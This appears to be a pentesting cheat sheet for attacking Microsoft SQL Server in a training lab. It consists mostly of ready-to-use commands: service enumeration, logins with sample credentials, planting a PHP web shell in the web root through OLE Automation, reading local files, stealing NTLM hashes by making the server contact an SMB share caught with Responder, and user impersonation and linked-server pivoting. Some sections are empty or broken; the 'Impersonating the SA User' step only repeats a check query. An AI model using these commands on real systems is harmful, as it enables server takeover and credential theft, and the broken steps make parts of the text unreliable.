1. Banner grabbing: `nmap -Pn -sV -sC -p1433 10.10.10.125`
2. Nmap: `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248`
2. MSSQL Ping in Metasploit: `msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248`
3. Connecting with Mssqlclient.py
    1. connect `python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth`
    2. Interact with: `select name from sys.databases`
4. Sqlcmd:
    1. Connecting to the SQL Server: `sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30`
    2. `SELECT name FROM master.dbo.sysdatabases`
    3. `Use table-name`
    4. `SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES`
    5. `SELECT * FROM users`
5. If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd: `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`
#### **XP_CMDSHELL**

#### **MSSQL - Enable Ole Automation Procedures**
```bash
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
#### **MSSQL - Create a File**
```bash
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
#### **Read Local Files in MSSQL**
```bash
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
#### **XP_DIRTREE Hash Stealing**
`EXEC master..xp_dirtree '\\10.10.110.17\share\'`
#### **XP_SUBDIRS Hash Stealing**
`EXEC master..xp_subdirs '\\10.10.110.17\share\'`
#### **XP_SUBDIRS Hash Stealing with Responder**
`sudo responder -I tun0`
#### **XP_SUBDIRS Hash Stealing with impacket**
`sudo impacket-smbserver share ./ -smb2support`
#### **Impersonate Existing Users with MSSQL**
```bash
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
#### **Verifying our Current User and Role**
```bash
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
#### **Impersonating the SA User**
```bash
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
#### **Identify linked Servers in MSSQL**
```bash
1> SELECT srvname, isremote FROM sysservers
2> GO
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```
##
